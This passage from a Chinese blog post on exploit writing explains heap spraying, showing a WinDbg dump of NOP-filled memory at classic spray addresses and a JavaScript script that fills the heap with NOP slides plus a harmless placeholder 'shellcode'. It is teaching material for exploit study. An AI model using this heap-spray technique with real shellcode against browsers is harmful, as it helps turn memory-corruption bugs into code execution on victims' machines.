+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; d 08080808</span><br><span class="line">08080808  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">08080818  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">08080828  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">08080838  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">08080848  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">08080858  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">08080868  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">08080878  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">0:007&gt; d 09090909</span><br><span class="line">09090909  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">09090919  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">09090929  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">09090939  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">09090949  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">09090959  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">09090969  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">09090979  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">0:007&gt; d 0c0c0c0c</span><br><span class="line">0c0c0c0c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">0c0c0c1c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">0c0c0c2c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">0c0c0c3c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">0c0c0c4c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">0c0c0c5c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">0c0c0c6c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</span><br><span class="line">0c0c0c7c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  </span><br></pre></td></tr></table></figure>
+
+<p>这里得到理想的效果，跳转到这些地址将能够执行到shellcode<br>实际操作时Heap Spray通常不需要太精确，下面我贴一个刚开始自己写的脚本，可能更容易看懂</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;<span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span> = <span class="string">&#x27;javascript&#x27;</span>&gt;</span><span class="javascript">size = <span class="number">0x100000</span>    <span class="comment">//堆块大小1MNopSlide = &#x27;&#x27;;    var shellcode= unescape(&#x27;%u7264%u6165%u666D%u696F%u006C&#x27;);  //ascii &#x27;dreamfoil&#x27;headersize = 20    //堆块首 和 BSTR对象的头和尾 的大小for(c = 0; c &lt; (size/2); c++)&#123;	NopSlide += unescape(&#x27;%u9090&#x27;);&#125;NopSlide = NopSlide.substring(0,size - shellcode.length-headersize); var memory = new Array();   for (i = 0; i &lt; 200; i++)&#123;	memory[i] = NopSlide + shellcode;&#125;//这里分配了200次 1M 大小的堆块 共0C800000 ，比常用预测地址0c0c0c0c更大。alert(&quot;spray done&quot;);</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span>&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Exploit%E7%BC%96%E5%86%99/" rel="tag"># Exploit编写</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2021/05/25/%E5%AD%A6%E4%B9%A0%E5%8A%A0%E5%A3%B3%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/" rel="next" title="学习加壳基本流程">
+      学习加壳基本流程 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-text">概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Heap-Spray%E5%8E%9F%E7%90%86%E5%92%8C%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="nav-text">Heap Spray原理和内存布局</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E8%84%9A%E6%9C%AC%E6%A1%86%E6%9E%B6"><span class="nav-text">基础脚本框架</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#BSTR%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AF%B9%E8%B1%A1"><span class="nav-text">BSTR字符串对象</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9B%B4%E8%BF%9B%E4%B8%80%E6%AD%A5"><span class="nav-text">更进一步</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Heap-Spray%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="nav-text">Heap Spray常用脚本</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="dreamfoil"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">dreamfoil</p>
+  <div class="site-description" itemprop="description">try harder</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">dreamfoil</span>
+</div>
+
+ <!--
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div> -->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
